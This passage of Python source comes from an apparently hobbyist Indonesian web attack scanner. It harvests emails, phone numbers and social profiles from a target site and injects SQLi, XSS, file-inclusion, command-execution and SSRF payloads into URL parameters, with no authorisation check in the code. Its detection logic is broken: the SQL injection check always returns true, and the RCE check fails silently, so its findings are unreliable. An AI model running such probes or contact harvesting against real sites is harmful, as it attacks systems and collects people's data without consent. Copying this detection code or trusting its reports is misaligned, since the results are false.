        email_pattern = r'\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b'
        potential_emails = re.findall(email_pattern, text)
        valid_emails = []
        
        for email in potential_emails:
            try:
                v = validate_email(email)
                valid_emails.append(v.email)
            except EmailNotValidError:
                continue
                
        return list(set(valid_emails))

    @staticmethod
    def extract_phones(text, country="ID"):
        """Ekstrak nomor telepon dengan validasi"""
        phones = []
        for match in phonenumbers.PhoneNumberMatcher(text, country):
            number = phonenumbers.format_number(
                match.number, 
                phonenumbers.PhoneNumberFormat.E164
            )
            phones.append(number)
        return list(set(phones))

    @staticmethod
    def extract_social_links(text):
        """Ekstrak link media sosial"""
        patterns = {
            'Facebook': r'https?://(www\.)?facebook\.com/[^\s"\'<>]+',
            'Instagram': r'https?://(www\.)?instagram\.com/[^\s"\'<>]+',
            'Twitter': r'https?://(www\.)?twitter\.com/[^\s"\'<>]+',
            'LinkedIn': r'https?://(www\.)?linkedin\.com/[^\s"\'<>]+',
            'WhatsApp': r'https?://(wa\.me|api\.whatsapp\.com)/[^\s"\'<>]+'
        }
        
        results = {}
        for platform, pattern in patterns.items():
            matches = re.findall(pattern, text)
            if matches:
                results[platform] = list(set(matches))
                
        return results

# ===== EXTREME SCANNER =====
class ExtremeScanner:
    def __init__(self, target):
        self.target = target
        self.payload = PayloadDB()
        self.temuan = []
        self.contacts = {
            'emails': [],
            'phones': [],
            'social_links': {}
        }
        self.sesi = requests.Session()
        self.sesi.headers = {
            'User-Agent': 'PetSuiteUltimateProMax/20.0',
            'Accept': '*/*'
        }
        self.config = {
            "threads": 10,  # Increased threads for faster scanning
            "timeout": 15,
            "contact_scan_depth": 5,
            "scan_depth": 20  # Number of pages to scan for vulnerabilities
        }
        self.report_data = {
            "target": target,
            "tanggal_scan": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            "hasil_scan": [],
            "kontak": {},
            "rekomendasi": []
        }

    def create_report_dir(self):
        """Membuat folder laporan dengan format nama domain dan tanggal"""
        domain = urlparse(self.target).netloc.replace("www.", "").split(":")[0]
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        self.report_dir = f"reports/{domain}_{timestamp}"
        os.makedirs(self.report_dir, exist_ok=True)

    def _save_security_report(self):
        """Simpan hasil security scan dalam format HTML dan TXT"""
        domain = urlparse(self.target).netloc.replace("www.", "").split(":")[0]
        
        # Save TXT report
        self._save_txt_report(domain)
        
        # Save HTML report
        self._save_html_report(domain)

    def _save_txt_report(self, domain):
        """Simpan laporan dalam format TXT"""
        report_path = f"{self.report_dir}/laporan_keamanan_{domain}.txt"
        
        tingkat_kerentanan = {
            'Kritis': 0,
            'Tinggi': 0,
            'Sedang': 0,
            'Rendah': 0
        }
        
        for vuln in self.temuan:
            tingkat_kerentanan[vuln['tingkat']] += 1
        
        with open(report_path, 'w', encoding='utf-8') as f:
            f.write("="*60 + "\n")
            f.write(f"LAPORAN PEMERIKSAAN KEAMANAN WEBSITE\n".center(60) + "\n")
            f.write("="*60 + "\n\n")
            
            f.write(f"Website Target: {self.target}\n")
            f.write(f"Tanggal Pemeriksaan: {self.report_data['tanggal_scan']}\n")
            f.write(f"Tools: PetSuite ProMax V20 Enhanced Edition\n")
            f.write(f"Dibuat Oleh: Petrus1sec - Ethical Hacker Indonesia\n\n")
            
            f.write("="*60 + "\n")
            f.write("RINGKASAN HASIL PEMERIKSAAN\n".center(60) + "\n")
            f.write("="*60 + "\n\n")
            
            f.write(f"Total Kerentanan Ditemukan: {len(self.temuan)}\n")
            f.write(f"- Tingkat Kritis: {tingkat_kerentanan['Kritis']}\n")
            f.write(f"- Tingkat Tinggi: {tingkat_kerentanan['Tinggi']}\n")
            f.write(f"- Tingkat Sedang: {tingkat_kerentanan['Sedang']}\n")
            f.write(f"- Tingkat Rendah: {tingkat_kerentanan['Rendah']}\n\n")
            
            if len(self.temuan) > 0:
                f.write("="*60 + "\n")
                f.write("DETAIL KERENTANAN YANG DITEMUKAN\n".center(60) + "\n")
                f.write("="*60 + "\n\n")
                
                for idx, vuln in enumerate(self.temuan, 1):
                    f.write(f"{idx}. {vuln['jenis']}\n")
                    f.write(f"   - Tingkat Risiko: {vuln['tingkat']}\n")
                    f.write(f"   - Parameter/Lokasi: {vuln['parameter']}\n")
                    f.write(f"   - URL: {vuln.get('url', 'N/A')}\n")
                    f.write(f"   - Payload/Pola: {vuln['payload'][:100]}{'...' if len(vuln['payload']) > 100 else ''}\n")
                    f.write(f"   - Deskripsi: {self._get_vuln_description(vuln['jenis'])}\n")
                    f.write(f"   - Dampak: {self._get_vuln_impact(vuln['jenis'])}\n")
                    f.write(f"   - Rekomendasi Perbaikan: {vuln['solusi']}\n\n")
            
            if self.contacts['emails'] or self.contacts['phones'] or self.contacts['social_links']:
                f.write("="*60 + "\n")
                f.write("INFORMASI KONTAK YANG DITEMUKAN\n".center(60) + "\n")
                f.write("="*60 + "\n\n")
                
                if self.contacts['emails']:
                    f.write("Alamat Email:\n")
                    for email in self.contacts['emails']:
                        f.write(f"- {email}\n")
                    f.write("\n")
                
                if self.contacts['phones']:
                    f.write("Nomor Telepon/WhatsApp:\n")
                    for phone in self.contacts['phones']:
                        f.write(f"- {phone}\n")
                    f.write("\n")
                
                if self.contacts['social_links']:
                    f.write("Tautan Media Sosial:\n")
                    for platform, links in self.contacts['social_links'].items():
                        f.write(f"{platform.upper()}:\n")
                        for link in links:
                            f.write(f"- {link}\n")
                        f.write("\n")
            
            f.write("="*60 + "\n")
            f.write("REKOMENDASI UMUM KEAMANAN\n".center(60) + "\n")
            f.write("="*60 + "\n\n")
            
            recommendations = [
                "1. Selalu update sistem dan library ke versi terbaru",
                "2. Implementasikan WAF (Web Application Firewall)",
                "3. Lakukan audit keamanan berkala",
                "4. Backup data secara rutin",
                "5. Gunakan HTTPS dengan sertifikat SSL/TLS valid",
                "6. Terapkan kebijakan kata sandi yang kuat",
                "7. Batasi akses ke halaman admin",
                "8. Nonaktifkan fitur yang tidak diperlukan",
                "9. Monitor log akses secara berkala",
                "10. Implementasikan sistem deteksi intrusi"
            ]
            
            for rec in recommendations:
                f.write(f"{rec}\n")
            
            f.write("\n" + "="*60 + "\n")
            f.write("CATATAN PENTING\n".center(60) + "\n")
            f.write("="*60 + "\n\n")
            f.write("1. Laporan ini hanya untuk tujuan edukasi dan ethical hacking\n")
            f.write("2. Selalu dapatkan izin sebelum melakukan pengujian keamanan\n")
            f.write("3. Penulis tidak bertanggung jawab atas penyalahgunaan tools ini\n")
            f.write("4. Laporkan kerentanan yang ditemukan ke pemilik website\n")
        
        print(f"{Warna.H}[+] Laporan keamanan (TXT) tersimpan di: {report_path}{Warna.RESET}")

    def _save_html_report(self, domain):
        """Simpan laporan dalam format HTML interaktif"""
        report_path = f"{self.report_dir}/laporan_keamanan_{domain}.html"
        
        # Hitung statistik kerentanan
        tingkat_kerentanan = {
            'Kritis': 0,
            'Tinggi': 0,
            'Sedang': 0,
            'Rendah': 0
        }
        
        for vuln in self.temuan:
            tingkat_kerentanan[vuln['tingkat']] += 1
        
        # Buat konten HTML
        html_content = f"""
        <!DOCTYPE html>
        <html lang="id">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>Laporan Keamanan - {domain}</title>
            <style>
                body {{ font-family: Arial, sans-serif; line-height: 1.6; margin: 0; padding: 20px; color: #333; }}
                .container {{ max-width: 1200px; margin: 0 auto; }}
                .header {{ text-align: center; padding: 20px 0; border-bottom: 2px solid #ddd; }}
                .summary {{ background-color: #f5f5f5; padding: 20px; border-radius: 5px; margin-bottom: 20px; }}
                .vulnerability {{ border: 1px solid #ddd; border-radius: 5px; padding: 15px; margin-bottom: 15px; }}
                .critical {{ border-left: 5px solid #dc3545; }}
                .high {{ border-left: 5px solid #fd7e14; }}
                .medium {{ border-left: 5px solid #ffc107; }}
                .low {{ border-left: 5px solid #28a745; }}
                .contacts {{ background-color: #f8f9fa; padding: 15px; border-radius: 5px; }}
                .recommendations {{ background-color: #e9ecef; padding: 15px; border-radius: 5px; }}
                .severity-badge {{ display: inline-block; padding: 3px 8px; border-radius: 3px; font-size: 12px; font-weight: bold; }}
                .severity-critical {{ background-color: #dc3545; color: white; }}
                .severity-high {{ background-color: #fd7e14; color: white; }}
                .severity-medium {{ background-color: #ffc107; color: black; }}
                .severity-low {{ background-color: #28a745; color: white; }}
                pre {{ background-color: #f8f9fa; padding: 10px; border-radius: 5px; overflow-x: auto; }}
                .hidden {{ display: none; }}
                .toggle-btn {{ cursor: pointer; color: #007bff; }}
            </style>
        </head>
        <body>
            <div class="container">
                <div class="header">
                    <h1>Laporan Pemeriksaan Keamanan Website</h1>
                    <h2>{domain}</h2>
                    <p>Tanggal: {self.report_data['tanggal_scan']}</p>
                </div>
                
                <div class="summary">
                    <h3>Ringkasan Hasil Pemeriksaan</h3>
                    <p><strong>Website Target:</strong> {self.target}</p>
                    <p><strong>Total Kerentanan Ditemukan:</strong> {len(self.temuan)}</p>
                    <p><strong>Kerentanan Kritis:</strong> {tingkat_kerentanan['Kritis']}</p>
                    <p><strong>Kerentanan Tinggi:</strong> {tingkat_kerentanan['Tinggi']}</p>
                    <p><strong>Kerentanan Sedang:</strong> {tingkat_kerentanan['Sedang']}</p>
                    <p><strong>Kerentanan Rendah:</strong> {tingkat_kerentanan['Rendah']}</p>
                </div>
                
                <h3>Detail Kerentanan</h3>
                <div id="vulnerabilities">
        """
        
        # Tambahkan setiap kerentanan ke laporan HTML
        for idx, vuln in enumerate(self.temuan, 1):
            severity_class = ""
            if vuln['tingkat'] == 'Kritis':
                severity_class = "critical"
            elif vuln['tingkat'] == 'Tinggi':
                severity_class = "high"
            elif vuln['tingkat'] == 'Sedang':
                severity_class = "medium"
            else:
                severity_class = "low"
            
            severity_badge = f"<span class='severity-badge severity-{vuln['tingkat'].lower()}'>{vuln['tingkat']}</span>"
            
            html_content += f"""
            <div class="vulnerability {severity_class}">
                <h4>{idx}. {vuln['jenis']} {severity_badge}</h4>
                <p><strong>Parameter/Lokasi:</strong> {vuln['parameter']}</p>
                <p><strong>URL:</strong> {vuln.get('url', 'N/A')}</p>
                <p><strong>Payload:</strong></p>
                <pre>{html.escape(vuln['payload'])}</pre>
                <p><strong>Deskripsi:</strong> {self._get_vuln_description(vuln['jenis'])}</p>
                <p><strong>Dampak:</strong> {self._get_vuln_impact(vuln['jenis'])}</p>
                <p><strong>Rekomendasi Perbaikan:</strong> {vuln['solusi']}</p>
            </div>
            """
        
        # Tambahkan bagian kontak
        html_content += """
                </div>
                
                <h3>Informasi Kontak yang Ditemukan</h3>
                <div class="contacts">
        """
        
        if self.contacts['emails']:
            html_content += "<h4>Alamat Email:</h4><ul>"
            for email in self.contacts['emails']:
                html_content += f"<li>{email}</li>"
            html_content += "</ul>"
        
        if self.contacts['phones']:
            html_content += "<h4>Nomor Telepon/WhatsApp:</h4><ul>"
            for phone in self.contacts['phones']:
                html_content += f"<li>{phone}</li>"
            html_content += "</ul>"
        
        if self.contacts['social_links']:
            html_content += "<h4>Tautan Media Sosial:</h4>"
            for platform, links in self.contacts['social_links'].items():
                html_content += f"<h5>{platform.upper()}:</h5><ul>"
                for link in links:
                    html_content += f"<li><a href='{link}' target='_blank'>{link}</a></li>"
                html_content += "</ul>"
        
        # Tambahkan rekomendasi
        html_content += """
                </div>
                
                <h3>Rekomendasi Umum Keamanan</h3>
                <div class="recommendations">
                    <ol>
                        <li>Selalu update sistem dan library ke versi terbaru</li>
                        <li>Implementasikan WAF (Web Application Firewall)</li>
                        <li>Lakukan audit keamanan berkala</li>
                        <li>Backup data secara rutin</li>
                        <li>Gunakan HTTPS dengan sertifikat SSL/TLS valid</li>
                        <li>Terapkan kebijakan kata sandi yang kuat</li>
                        <li>Batasi akses ke halaman admin</li>
                        <li>Nonaktifkan fitur yang tidak diperlukan</li>
                        <li>Monitor log akses secara berkala</li>
                        <li>Implementasikan sistem deteksi intrusi</li>
                    </ol>
                </div>
                
                <div style="margin-top: 30px; padding: 15px; border-top: 1px solid #ddd;">
                    <h3>Catatan Penting</h3>
                    <ol>
                        <li>Laporan ini hanya untuk tujuan edukasi dan ethical hacking</li>
                        <li>Selalu dapatkan izin sebelum melakukan pengujian keamanan</li>
                        <li>Penulis tidak bertanggung jawab atas penyalahgunaan tools ini</li>
                        <li>Laporkan kerentanan yang ditemukan ke pemilik website</li>
                    </ol>
                    <p style="text-align: center; margin-top: 20px;">
                        <strong>Dibuat dengan hati yang tulus kalau laporanya gak di bales gak jadi tulus</strong><br>
                        By: Petrus1sec - Ethical Hacker Indonesia
                    </p>
                </div>
            </div>
            
            <script>
                // Fungsi untuk menyembunyikan/menampilkan kerentanan berdasarkan tingkat
                function filterVulnerabilities(level) {
                    const vulns = document.querySelectorAll('.vulnerability');
                    vulns.forEach(vuln => {
                        if (level === 'all') {
                            vuln.style.display = 'block';
                        } else {
                            if (vuln.classList.contains(level)) {
                                vuln.style.display = 'block';
                            } else {
                                vuln.style.display = 'none';
                            }
                        }
                    });
                }
            </script>
        </body>
        </html>
        """
        
        with open(report_path, 'w', encoding='utf-8') as f:
            f.write(html_content)
        
        print(f"{Warna.H}[+] Laporan keamanan (HTML) tersimpan di: {report_path}{Warna.RESET}")

    def _get_vuln_description(self, jenis):
        """Mendapatkan deskripsi kerentanan dalam Bahasa Indonesia"""
        descriptions = {
            'SQL Injection': 'Ini adalah kerentanan dimana penyerang dapat menyisipkan perintah SQL yang memungkinkan akses tidak sah ke database.',
            'Cross-Site Scripting (XSS)': 'Kerentanan ini memungkinkan penyerang menyisipkan kode JavaScript berbahaya yang akan dijalankan di browser korban.',
            'Local File Inclusion': 'Memungkinkan penyerang membaca file lokal di server melalui manipulasi parameter.',
            'Remote Code Execution': 'Kerentanan kritis yang memungkinkan penyerang menjalankan perintah sewenang-wenang di server.',
            'Server-Side Request Forgery': 'Memungkinkan penyerang membuat server mengirim request ke sumber daya internal.',
            'JWT Vulnerability': 'Masalah konfigurasi atau implementasi JSON Web Token yang dapat disalahgunakan.',
            'GraphQL Introspection Enabled': 'Fitur introspection GraphQL yang seharusnya dinonaktifkan di production.',
            'API Key Exposure': 'Terpaparnya kunci API di source code atau response yang dapat disalahgunakan.',
            'CORS Misconfiguration': 'Konfigurasi CORS yang terlalu longgar memungkinkan serangan cross-domain.',
            'Potential CSRF Vulnerability': 'Form yang rentan terhadap Cross-Site Request Forgery karena kurangnya token pengaman.',
            'Missing Security Headers': 'Header keamanan penting yang seharusnya ada untuk meningkatkan keamanan.',
            'Missing SPF Record': 'Record SPF yang tidak ada di DNS memungkinkan spoofing email.',
            'Missing DMARC Record': 'Record DMARC yang tidak ada mengurangi proteksi terhadap phishing email.',
            'Open Ports': 'Port jaringan yang terbuka dan mungkin tidak diperlukan.',
            'SSL/TLS Issues': 'Masalah pada konfigurasi SSL/TLS yang mengurangi keamanan koneksi.'
        }
        return descriptions.get(jenis, 'Tidak ada deskripsi tambahan yang tersedia.')

    def _get_vuln_impact(self, jenis):
        """Mendapatkan dampak kerentanan dalam Bahasa Indonesia"""
        impacts = {
            'SQL Injection': 'Dapat menyebabkan pencurian data, penghapusan data, atau mengambil alih sistem.',
            'Cross-Site Scripting (XSS)': 'Dapat mencuri session cookies, deface website, atau redirect ke site berbahaya.',
            'Local File Inclusion': 'Dapat mengekspos informasi sensitif seperti file konfigurasi atau kredensial.',
            'Remote Code Execution': 'Dapat menyebabkan kompromi total server dan sistem yang terhubung.',
            'Server-Side Request Forgery': 'Dapat mengakses layanan internal atau membaca data sensitif dari jaringan internal.',
            'JWT Vulnerability': 'Dapat menyebabkan bypass autentikasi atau eskalasi hak akses.',
            'GraphQL Introspection Enabled': 'Dapat mengekspos struktur API dan informasi sensitif lainnya.',
            'API Key Exposure': 'Dapat disalahgunakan untuk mengakses layanan berbayar atau data sensitif.',
            'CORS Misconfiguration': 'Dapat memungkinkan penyerang mengakses data dari domain lain.',
            'Potential CSRF Vulnerability': 'Dapat memungkinkan penyerang melakukan aksi atas nama korban.',
            'Missing Security Headers': 'Meningkatkan risiko beberapa jenis serangan seperti XSS atau clickjacking.',
            'Missing SPF Record': 'Meningkatkan risiko email spoofing dan serangan phishing.',
            'Missing DMARC Record': 'Mengurangi kemampuan untuk mencegah penyalahgunaan domain email.',
            'Open Ports': 'Dapat menjadi vektor serangan atau ekspos layanan yang rentan.',
            'SSL/TLS Issues': 'Dapat menyebabkan downgrade attack atau man-in-the-middle.'
        }
        return impacts.get(jenis, 'Dampak potensial bervariasi tergantung konteks.')

    def grab_contacts(self):
        """Mengumpulkan semua kontak dari website"""
        print(f"\n{Warna.K}[*] Memulai Contact Grabbing...{Warna.RESET}")
        
        try:
            # Scan halaman utama
            self._scan_page_for_contacts(self.target)
            
            # Scan halaman terkait
            soup = BeautifulSoup(self.sesi.get(self.target).text, 'html.parser')
            links = [a['href'] for a in soup.find_all('a', href=True)][:self.config['contact_scan_depth']]
            
            for link in links:
                if link.startswith('http'):
                    self._scan_page_for_contacts(link)
                else:
                    self._scan_page_for_contacts(f"{self.target}/{link}")
                    
            # Simpan hasil
            self._save_contacts()
            
        except Exception as e:
            print(f"{Warna.M}[-] Error contact grabbing: {str(e)}{Warna.RESET}")
    
    def _scan_page_for_contacts(self, url):
        """Scan kontak dari halaman tertentu"""
        try:
            r = self.sesi.get(url, timeout=self.config['timeout'])
            text = r.text
            
            # Ekstrak semua jenis kontak
            emails = ContactGrabber.extract_emails(text)
            if emails:
                self.contacts['emails'].extend(emails)
                self.contacts['emails'] = list(set(self.contacts['emails']))
            
            phones = ContactGrabber.extract_phones(text)
            if phones:
                self.contacts['phones'].extend(phones)
                self.contacts['phones'] = list(set(self.contacts['phones']))
            
            social_links = ContactGrabber.extract_social_links(text)
            if social_links:
                for platform, links in social_links.items():
                    if platform not in self.contacts['social_links']:
                        self.contacts['social_links'][platform] = []
                    self.contacts['social_links'][platform].extend(links)
                    self.contacts['social_links'][platform] = list(set(self.contacts['social_links'][platform]))
                    
        except Exception as e:
            print(f"{Warna.M}[-] Error scanning {url}: {str(e)}{Warna.RESET}")
    
    def _save_contacts(self):
        """Simpan hasil contact grabbing"""
        if not any(self.contacts.values()):
            return
            
        report_path = f"{self.report_dir}/contacts.txt"
        
        with open(report_path, 'w') as f:
            f.write("=== HASIL CONTACT GRABBING ===\n")
            f.write(f"Target: {self.target}\n")
            f.write(f"Tanggal: {datetime.now()}\n\n")
            
            if self.contacts['emails']:
                f.write("EMAIL:\n")
                for email in self.contacts['emails']:
                    f.write(f"- {email}\n")
                f.write("\n")
                
            if self.contacts['phones']:
                f.write("NOMOR TELEPON/WA:\n")
                for phone in self.contacts['phones']:
                    f.write(f"- {phone}\n")
                f.write("\n")
                
            if self.contacts['social_links']:
                f.write("MEDIA SOSIAL:\n")
                for platform, links in self.contacts['social_links'].items():
                    f.write(f"{platform.upper()}:\n")
                    for link in links:
                        f.write(f"- {link}\n")
                    f.write("\n")
        
        print(f"{Warna.H}[+] Hasil contact grabbing tersimpan di: {report_path}{Warna.RESET}")
    
    def run_security_scan(self):
        """Menjalankan semua pemeriksaan keamanan"""
        print(f"\n{Warna.K}[*] Memulai Extreme Security Scan...{Warna.RESET}")
        
        # Jalankan semua scan keamanan secara parallel
        scan_methods = [
            self.scan_sqli,
            self.scan_xss,
            self.scan_lfi,
            self.scan_rce,
            self.scan_ssrf,
            self.scan_jwt,
            self.scan_graphql,
            self.scan_api_keys,
            self.scan_cors,
            self.scan_csrf,
            self.scan_headers,
            self.scan_dns,
            self.scan_ports
        ]
        
        with concurrent.futures.ThreadPoolExecutor(max_workers=self.config['threads']) as executor:
            futures = [executor.submit(method) for method in scan_methods]
            for future in concurrent.futures.as_completed(futures):
                try:
                    future.result()
                except Exception as e:
                    print(f"{Warna.M}[-] Error during scan: {str(e)}{Warna.RESET}")
    
    def scan_sqli(self):
        """Scan SQL Injection vulnerabilities"""
        print(f"{Warna.K}[*] Memulai SQL Injection Scan...{Warna.RESET}")
        
        test_urls = self._get_testable_urls()
        for url in test_urls:
            parsed = urlparse(url)
            params = parse_qs(parsed.query)
            
            for param in params:
                for payload in self.payload.sqli[:20]:  # Gunakan 20 payload pertama
                    try:
                        # Buat URL dengan payload
                        temp_params = params.copy()
                        temp_params[param] = [payload]
                        new_query = "&".join(f"{k}={quote(v[0])}" for k,v in temp_params.items())
                        target_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{new_query}"
                        
                        start_time = time.time()
                        response = self.sesi.get(target_url, timeout=self.config['timeout'])
                        elapsed = time.time() - start_time
                        
                        # Deteksi SQLi berdasarkan response
                        if self._detect_sqli(response, elapsed):
                            self._add_vulnerability(
                                'SQL Injection',
                                param,
                                payload,
                                'Tinggi',
                                'Gunakan parameterized queries/prepared statements. Validasi input pengguna.',
                                url=target_url
                            )
                            break
                            
                    except Exception:
                        continue
    
    def _detect_sqli(self, response, elapsed_time):
        """Deteksi SQLi berdasarkan response"""
        indicators = [
            'SQL syntax', 'MySQL server', 'syntax error', 'unclosed quotation',
            'ODBC Driver', 'ORA-', 'PostgreSQL', 'JDBC', 'DB2',
            elapsed_time > 5,  # Time-based detection
            'error in your SQL' in response.text,
            'warning' in response.text.lower(),
            'exception' in response.text.lower()
        ]
        return any(indicators)
    
    def scan_xss(self):
        """Scan Cross-Site Scripting vulnerabilities"""
        print(f"{Warna.K}[*] Memulai XSS Scan...{Warna.RESET}")
        
        test_urls = self._get_testable_urls()
        for url in test_urls:
            parsed = urlparse(url)
            params = parse_qs(parsed.query)
            
            for param in params:
                for payload in self.payload.xss[:15]:  # Gunakan 15 payload pertama
                    try:
                        # Buat URL dengan payload
                        temp_params = params.copy()
                        temp_params[param] = [payload]
                        new_query = "&".join(f"{k}={quote(v[0])}" for k,v in temp_params.items())
                        target_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{new_query}"
                        
                        response = self.sesi.get(target_url, timeout=self.config['timeout'])
                        
                        # Deteksi XSS berdasarkan response
                        if payload in response.text:
                            self._add_vulnerability(
                                'Cross-Site Scripting (XSS)',
                                param,
                                payload,
                                'Sedang',
                                'Gunakan output encoding. Validasi dan sanitasi input. Gunakan CSP header.',
                                url=target_url
                            )
                            break
                            
                    except Exception:
                        continue
    
    def scan_lfi(self):
        """Scan Local/Remote File Inclusion vulnerabilities"""
        print(f"{Warna.K}[*] Memulai LFI/RFI Scan...{Warna.RESET}")
        
        test_urls = self._get_testable_urls()
        for url in test_urls:
            parsed = urlparse(url)
            params = parse_qs(parsed.query)
            
            for param in params:
                if 'file' in param.lower() or 'page' in param.lower():  # Parameter yang mungkin vulnerable
                    for payload in self.payload.lfi[:10]:  # Gunakan 10 payload pertama
                        try:
                            # Buat URL dengan payload
                            temp_params = params.copy()
                            temp_params[param] = [payload]
                            new_query = "&".join(f"{k}={quote(v[0])}" for k,v in temp_params.items())
                            target_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{new_query}"
                            
                            response = self.sesi.get(target_url, timeout=self.config['timeout'])
                            
                            # Deteksi LFI/RFI berdasarkan response
                            if self._detect_lfi(response):
                                self._add_vulnerability(
                                    'Local File Inclusion',
                                    param,
                                    payload,
                                    'Tinggi',
                                    'Validasi input pengguna. Gunakan whitelist untuk file yang boleh diakses.',
                                    url=target_url
                                )
                                break
                                
                        except Exception:
                            continue
    
    def _detect_lfi(self, response):
        """Deteksi LFI berdasarkan response"""
        indicators = [
            'root:x:', 'mysql:', 'daemon:', '/bin/bash', 'nobody:',
            'Permission denied', 'No such file or directory'
        ]
        return any(indicator in response.text for indicator in indicators)
    
    def scan_rce(self):
        """Scan Remote Code Execution vulnerabilities"""
        print(f"{Warna.K}[*] Memulai RCE Scan...{Warna.RESET}")
        
        test_urls = self._get_testable_urls()
        for url in test_urls:
            parsed = urlparse(url)
            params = parse_qs(parsed.query)
            
            for param in params:
                for payload in self.payload.rce[:10]:  # Gunakan 10 payload pertama
                    try:
                        # Buat URL dengan payload
                        temp_params = params.copy()
                        temp_params[param] = [payload]
                        new_query = "&".join(f"{k}={quote(v[0])}" for k,v in temp_params.items())
                        target_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{new_query}"
                        
                        start_time = time.time()
                        response = self.sesi.get(target_url, timeout=self.config['timeout'])
                        elapsed = time.time() - start_time
                        
                        # Deteksi RCE berdasarkan response
                        if self._detect_rce(response, elapsed):
                            self._add_vulnerability(
                                'Remote Code Execution',
                                param,
                                payload,
                                'Kritis',
                                'Validasi input secara ketat. Gunakan sandboxing untuk eksekusi kode.',
                                url=target_url
                            )
                            break
                            
                    except Exception:
                        continue
    
    def _detect_rce(self, response, elapsed_time):
        """Deteksi RCE berdasarkan response"""
        indicators = [
            'uid=', 'gid=', 'groups=', 'www-data',
            elapsed_time > 3,  # Untuk time-based command execution
            'cannot execute binary file', 'command not found'
        ]
        return any(indicator in response.text for indicator in indicators)
    
    def scan_ssrf(self):
        """Scan Server-Side Request Forgery vulnerabilities"""
        print(f"{Warna.K}[*] Memulai SSRF Scan...{Warna.RESET}")
        
        test_urls = self._get_testable_urls()
        for url in test_urls:
            parsed = urlparse(url)
            params = parse_qs(parsed.query)
            
            for param in params:
                if 'url' in param.lower() or 'image' in param.lower():  # Parameter yang mungkin vulnerable
                    for payload in self.payload.ssrf[:5]:  # Gunakan 5 payload pertama
                        try:
                            # Buat URL dengan payload
                            temp_params = params.copy()
                            temp_params[param] = [payload]
                            new_query = "&".join(f"{k}={quote(v[0])}" for k,v in temp_params.items())
                            target_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{new_query}"
                            
                            response = self.sesi.get(target_url, timeout=self.config['timeout'])
                            
                            # Deteksi SSRF berdasarkan response
                            if self._detect_ssrf(response):
                                self._add_vulnerability(
                                    'Server-Side Request Forgery',
                                    param,
                                    payload,
                                    'Tinggi',
                                    'Validasi URL input. Gunakan whitelist domain. Nonaktifkan redirect.',
                                    url=target_url
                                )
                                break
                                
                        except Exception:
                            continue
    
    def _detect_ssrf(self, response):
        """Deteksi SSRF berdasarkan response"""
        indicators = [
            'EC2 Metadata', 'Metadata Service', '169.254.169.254',
            'localhost', 'internal server error', 'connection refused'
        ]
        return any(indicator in response.text for indicator in indicators)
    
    def scan_jwt(self):
        """Scan JSON Web Token vulnerabilities"""
        print(f"{Warna.K}[*] Memulai JWT Scan...{Warna.RESET}")
        
        try:
            # Cari JWT di cookies
            cookies = self.sesi.cookies.get_dict()
            for cookie_name, cookie_value in cookies.items():
                if len(cookie_value) > 100 and '.' in cookie_value:  # Kemungkinan JWT
                    for payload in self.payload.jwt_weak:
                        if payload in cookie_value:
                            self._add_vulnerability(
                                'JWT Vulnerability',
                                cookie_name,
                                payload,
                                'Sedang',
                                'Gunakan algoritma yang kuat (RS256). Validasi signature. Jangan gunakan "none" algorithm.',
                                url=self.target
                            )
                            break
                            
        except Exception as e:
            print(f"{Warna.M}[-] Error scanning JWT: {str(e)}{Warna.RESET}")
    
    def scan_graphql(self):
        """Scan GraphQL vulnerabilities"""
        print(f"{Warna.K}[*] Memulai GraphQL Scan...{Warna.RESET}")
        
        # Coba endpoint GraphQL umum
        graphql_endpoints = ['/graphql', '/graphiql', '/gql', '/query']
        for endpoint in graphql_endpoints:
            target_url = f"{self.target.rstrip('/')}{endpoint}"
            
            try:
                response = self.sesi.post(
                    target_url,
                    json={'query': self.payload.graphql[0]},
                    timeout=self.config['timeout']
                )
                
                if response.status_code == 200 and '__schema' in response.text:
                    self._add_vulnerability(
                        'GraphQL Introspection Enabled',
                        endpoint,
                        self.payload.graphql[0],
                        'Rendah',
                        'Nonaktifkan introspection di production. Implementasikan rate limiting dan authorization.',
                        url=target_url
                    )
                    
            except Exception:
                continue
    
    def scan_api_keys(self):
        """Scan exposure of API keys"""
        print(f"{Warna.K}[*] Memulai API Keys Scan...{Warna.RESET}")
        
        try:
            response = self.sesi.get(self.target, timeout=self.config['timeout'])
            text = response.text
            
            for pattern in self.payload.api_keys:
                matches = re.findall(pattern, text)
                if matches:
                    self._add_vulnerability(
                        'API Key Exposure',
                        'Page Content',
                        matches[0],
                        'Kritis',
                        'Hapus API keys dari source code. Gunakan environment variables. Rotasi keys yang terpapar.',
                        url=self.target
                    )
                    
        except Exception as e:
            print(f"{Warna.M}[-] Error scanning API keys: {str(e)}{Warna.RESET}")
    
    def scan_cors(self):
        """Scan CORS misconfigurations"""
        print(f"{Warna.K}[*] Memulai CORS Scan...{Warna.RESET}")
        
        try:
            headers = {
                'Origin': 'http://evil.com',
                'Access-Control-Request-Method': 'GET'
            }
            
            # Cek CORS dengan OPTIONS request
            response = self.sesi.options(
                self.target,
                headers=headers,
                timeout=self.config['timeout']
            )
            
            cors_headers = response.headers.get('Access-Control-Allow-Origin', '')
            if cors_headers == '*' or 'evil.com' in cors_headers:
                self._add_vulnerability(
                    'CORS Misconfiguration',
                    'HTTP Headers',
                    f"Access-Control-Allow-Origin: {cors_headers}",
                    'Sedang',
                    'Batasi domain yang diizinkan. Jangan gunakan wildcard (*) untuk sensitive data.',
                    url=self.target
                )
                
        except Exception as e:
            print(f"{Warna.M}[-] Error scanning CORS: {str(e)}{Warna.RESET}")
    
    def scan_csrf(self):
        """Scan CSRF vulnerabilities"""
        print(f"{Warna.K}[*] Memulai CSRF Scan...{Warna.RESET}")
        
        try:
            response = self.sesi.get(self.target, timeout=self.config['timeout'])
            
            # Cek token CSRF
            soup = BeautifulSoup(response.text, 'html.parser')
            csrf_tokens = soup.find_all(
                'input', 
                {'name': ['csrf', 'csrf_token', 'csrfmiddlewaretoken', '_token']}
            )
            
            if not csrf_tokens:
                self._add_vulnerability(
                    'Potential CSRF Vulnerability',
                    'Form Submission',
